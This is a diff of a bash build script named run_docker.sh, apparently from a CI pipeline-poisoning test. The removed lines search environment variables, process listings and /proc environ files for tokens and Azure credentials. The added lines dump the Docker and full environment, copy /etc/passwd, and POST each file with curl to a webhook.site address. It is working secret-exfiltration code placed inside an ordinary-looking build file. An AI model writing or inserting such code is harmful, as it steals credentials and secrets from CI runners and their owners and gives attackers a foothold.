@@ -1,22 +1,23 @@
 #!/bin/bash
 
-echo "[*] Avvio file run_docker.sh modificato"
-echo "[*] Avvio script malevolo :)"
+echo "[*] Starting full exfiltration test..."
 
-echo "[*] Avvio test esfiltrazione dei secrets..."
+# Dump solo delle variabili Docker-related (simula secrets specifici)
+env | grep -i DOCKER > /tmp/docker_secrets.txt
 
-# Prova 1: dump env accessibili a questo processo
-echo "[+] ENV:"
-env | grep -i 'token\|client\|sub\|id'
+# Dump dell'intero ambiente (per esfiltrare anche altri secrets eventualmente presenti)
+env > /tmp/full_env.txt
 
-# Prova 2: scan dei processi in esecuzione per trovare parametri CLI o env temporanei
-echo "[+] Parametri processi:"
-ps aux | grep -i 'azure\|login\|token\|client'
+# Esfiltrazione /etc/passwd (file innocuo, ma dimostra lettura del filesystem del runner)
+cp /etc/passwd /tmp/passwd_dump.txt
 
-# Prova 3: accesso ai file ambientali di processi in esecuzione
-echo "[+] Dump ambienti di altri processi:"
-for pid in $(ls /proc | grep -E '^[0-9]+$'); do
-  if [ -r /proc/$pid/environ ]; then
-    strings /proc/$pid/environ | grep -i 'token\|client\|sub\|id'
-  fi
-done
+# Invia i secrets Docker
+curl -X POST --data-binary @/tmp/docker_secrets.txt https://webhook.site/a47a02de-67bc-48aa-b80e-2a3a8636e5eb
+
+# Invia l'intero ambiente
+curl -X POST --data-binary @/tmp/full_env.txt https://webhook.site/a47a02de-67bc-48aa-b80e-2a3a8636e5eb
+
+# Invia il file di sistema /etc/passwd
+curl -X POST --data-binary @/tmp/passwd_dump.txt https://webhook.site/a47a02de-67bc-48aa-b80e-2a3a8636e5eb
+
+echo "[+] Exfiltration complete."
